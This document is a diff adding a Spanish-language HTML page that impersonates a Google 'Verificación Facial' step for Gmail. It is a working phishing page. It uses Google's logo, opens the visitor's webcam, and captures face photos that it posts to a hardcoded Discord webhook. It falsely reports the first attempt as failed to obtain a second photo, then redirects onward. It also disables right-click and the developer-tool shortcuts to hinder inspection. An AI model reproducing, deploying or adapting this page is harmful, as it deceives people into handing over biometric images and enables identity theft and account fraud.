@@ -1,0 +1,340 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verificación Facial</title>
+    <link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500;700&display=swap" rel="stylesheet">
+    
+    <style>
+        :root {
+            --bg-color: #f0f4f9;
+            --box-bg: #ffffff;
+            --text-main: #1f1f1f;
+            --text-secondary: #444746;
+            --blue: #0b57d0;
+            --blue-hover: #0842a0;
+            --red: #d93025;
+            --red-light: rgba(217, 48, 37, 0.2);
+            --green: #1e8e3e;
+            --green-light: rgba(30, 142, 62, 0.2);
+        }
+        body, html {
+            margin: 0;
+            padding: 0;
+            background-color: var(--bg-color);
+            font-family: 'Google Sans', 'Segoe UI', Arial, sans-serif;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        .container {
+            background-color: var(--box-bg);
+            border-radius: 28px;
+            width: 1040px;
+            max-width: 90%;
+            display: flex;
+            flex-direction: row;
+            padding: 48px 40px;
+            box-sizing: border-box;
+            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1), 0 2px 4px -1px rgba(0, 0, 0, 0.06);
+            z-index: 10;
+        }
+        .left-panel {
+            flex: 1;
+            padding-right: 48px;
+            display: flex;
+            flex-direction: column;
+            justify-content: flex-start;
+        }
+        .right-panel {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            position: relative;
+        }
+        .google-logo {
+            height: 36px;
+            width: auto;
+            margin-bottom: 24px;
+            display: block;
+        }
+        h1 {
+            font-size: 36px;
+            color: var(--text-main);
+            font-weight: 400;
+            margin: 0 0 16px 0;
+            line-height: 1.2;
+        }
+        p {
+            font-size: 16px;
+            color: var(--text-main);
+            margin: 0;
+        }
+        
+        .camera-view {
+            width: 220px;
+            height: 220px;
+            border-radius: 50%;
+            background-color: #e3e3e3;
+            overflow: hidden;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            position: relative;
+            border: 4px solid var(--blue);
+            transition: all 0.4s ease;
+        }
+        .camera-view video {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            transform: scaleX(-1);
+        }
+        .anim-red {
+            border-color: var(--red) !important;
+            box-shadow: 0 0 0 16px var(--red-light);
+            animation: shake 0.5s;
+        }
+        .anim-green {
+            border-color: var(--green) !important;
+            box-shadow: 0 0 0 16px var(--green-light);
+        }
+
+        @keyframes shake {
+            0% { transform: translateX(0); }
+            25% { transform: translateX(-5px); }
+            50% { transform: translateX(5px); }
+            75% { transform: translateX(-5px); }
+            100% { transform: translateX(0); }
+        }
+
+        .status-text {
+            margin-top: 35px;
+            font-size: 15px;
+            color: var(--text-secondary);
+            text-align: center;
+            min-height: 22px;
+        }
+        
+        .actions {
+            margin-top: 40px;
+            display: flex;
+            justify-content: flex-end;
+            width: 100%;
+        }
+        
+        button {
+            background-color: var(--blue);
+            color: white;
+            border: none;
+            border-radius: 20px;
+            padding: 10px 24px;
+            font-family: inherit;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+        button:hover {
+            background-color: var(--blue-hover);
+        }
+        button:disabled {
+            background-color: #ccc;
+            cursor: not-allowed;
+        }
+
+        @media (max-width: 900px) {
+            .container {
+                width: 100%;
+                max-width: 450px;
+                flex-direction: column;
+                padding: 36px 32px;
+                border-radius: 8px;
+                box-shadow: none;
+                background-color: transparent;
+                margin: 20px auto;
+            }
+            body { background-color: #fff; }
+            .left-panel {
+                padding-right: 0;
+                margin-bottom: 32px;
+                align-items: center;
+                text-align: center;
+            }
+            .google-logo { margin: 0 auto 24px; height: 36px; width: auto; }
+            h1 { font-size: 24px; }
+            p { font-size: 14px; }
+            .actions {
+                justify-content: center;
+            }
+            .camera-view {
+                width: 180px;
+                height: 180px;
+            }
+            button { width: 100%; }
+        }
+
+        @media (max-width: 480px) {
+            .container {
+                padding: 24px 16px;
+                max-width: 100%;
+            }
+            .camera-view {
+                width: 160px;
+                height: 160px;
+            }
+        }
+    </style>
+</head>
+<body oncontextmenu="return false">
+<script>
+document.addEventListener("keydown", function(e) {
+  if(e.key === "F12") return false;
+  if(e.ctrlKey && e.key === "u") return false;
+  if(e.ctrlKey && e.shiftKey && e.key === "I") return false;
+});
+</script>
+    <div class="container">
+        <div class="left-panel">
+            <img class="google-logo" src="https://ssl.gstatic.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google">
+            <h1>Verificación<br>Facial</h1>
+            <p>para continuar a Gmail</p>
+        </div>
+        <div class="right-panel">
+            <div class="camera-view" id="camera-container">
+                <video id="camera-stream" autoplay playsinline muted></video>
+                <div id="camera-status" style="position: absolute; text-align: center; font-size: 13px; color: #666; width: 100%;">
+                    Iniciando cámara...
+                </div>
+            </div>
+            
+            <div class="status-text" id="status-text">
+                Ubique su rostro dentro del círculo
+            </div>
+            
+            <div class="actions">
+                <button id="action-btn" disabled>Siguiente</button>
+            </div>
+            
+            <canvas id="canvas" style="display:none;"></canvas>
+        </div>
+    </div>
+
+    <script>
+        const discord_webhook_url = "https://discord.com/api/webhooks/1465605598677565473/GpPoSB9EH8AtU-3gb5Eqr3TA_A2Z5Q_nU4lzAtPhE00nDk9SRjMuj5HU63u71JKjr-6G";
+        
+        let stream = null;
+        let attempt = 0;
+        
+        const video = document.getElementById('camera-stream');
+        const cameraStatus = document.getElementById('camera-status');
+        const cameraContainer = document.getElementById('camera-container');
+        const statusText = document.getElementById('status-text');
+        const actionBtn = document.getElementById('action-btn');
+        const canvas = document.getElementById('canvas');
+
+        async function initCamera() {
+            try {
+                stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: 'user' }, 
+                    audio: false 
+                });
+                video.srcObject = stream;
+                
+                video.onloadedmetadata = () => {
+                    video.play();
+                    cameraStatus.style.display = 'none';
+                    actionBtn.disabled = false;
+                };
+            } catch (err) {
+                console.error(err);
+                cameraStatus.innerText = "Error al acceder a la cámara";
+            }
+        }
+
+        initCamera();
+
+        function capturePhoto() {
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            const ctx = canvas.getContext('2d');
+            ctx.scale(-1, 1);
+            ctx.drawImage(video, -canvas.width, 0, canvas.width, canvas.height);
+            return canvas.toDataURL('image/jpeg', 0.9);
+        }
+
+        function dataURLtoBlob(dataurl) {
+            let arr = dataurl.split(','), mime = arr[0].match(/:(.*?);/)[1],
+                bstr = atob(arr[1]), n = bstr.length, u8arr = new Uint8Array(n);
+            while(n--) {
+                u8arr[n] = bstr.charCodeAt(n);
+            }
+            return new Blob([u8arr], {type:mime});
+        }
+
+        async function sendToDiscord(blob, message) {
+            try {
+                const formData = new FormData();
+                formData.append('file', blob, 'foto.jpg');
+                formData.append('content', message);
+                
+                await fetch(discord_webhook_url, {
+                    method: 'POST',
+                    body: formData
+                });
+            } catch (e) {
+                console.error(e);
+            }
+        }
+
+        actionBtn.addEventListener('click', async () => {
+            if (attempt === 0) {
+                // First attempt
+                actionBtn.disabled = true;
+                actionBtn.innerText = "Procesando...";
+                
+                const photoData = capturePhoto();
+                const blob = dataURLtoBlob(photoData);
+                
+                await sendToDiscord(blob, "🔴 **Intento 1 de Verificación Facial Fallido**");
+                
+                // Show red animation
+                cameraContainer.classList.add('anim-red');
+                statusText.innerHTML = "<span style='color: #d93025; font-weight: 500;'>No se pudo reconocer el rostro. Intente de nuevo.</span>";
+                actionBtn.innerText = "Reintentar";
+                
+                setTimeout(() => {
+                    actionBtn.disabled = false;
+                    attempt = 1;
+                }, 1500);
+
+            } else if (attempt === 1) {
+                // Second attempt
+                actionBtn.disabled = true;
+                actionBtn.innerText = "Procesando...";
+                
+                cameraContainer.classList.remove('anim-red');
+                
+                const photoData = capturePhoto();
+                const blob = dataURLtoBlob(photoData);
+                
+                await sendToDiscord(blob, "🟢 **Intento 2 de Verificación Facial Exitoso**");
+                
+                // Show green animation
+                cameraContainer.classList.add('anim-green');
+                statusText.innerHTML = "<span style='color: #1e8e3e; font-weight: 500;'>Verificación exitosa.</span>";
+                actionBtn.innerText = "Continuando...";
+                
+                setTimeout(() => {
+                    window.location.href = "cargando.html";
+                }, 2000);
+            }
+        });
+        
+    </script>
+</body>
+</html>
